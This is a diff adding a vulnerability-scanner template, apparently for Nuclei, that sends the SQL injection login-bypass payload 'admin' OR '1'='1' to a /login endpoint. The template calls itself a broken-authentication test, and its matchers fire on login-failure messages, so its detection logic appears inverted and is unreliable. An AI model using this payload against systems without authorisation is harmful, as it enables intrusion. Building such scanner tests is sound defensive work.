@@ -1,0 +1,25 @@
+id: broken-authentication-test
+info:
+  name: Broken Authentication Vulnerability Test
+  description: Test for broken authentication vulnerabilities in login forms.
+  severity: Critical
+  author: Project
+  tags:
+    - authentication
+    - security
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+    body:
+      - "username=admin&password=admin' OR '1'='1"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Auth-Scanner
+    matchers:
+      - type: word
+        words:
+          - login failed
+          - incorrect username or password
+        condition: or
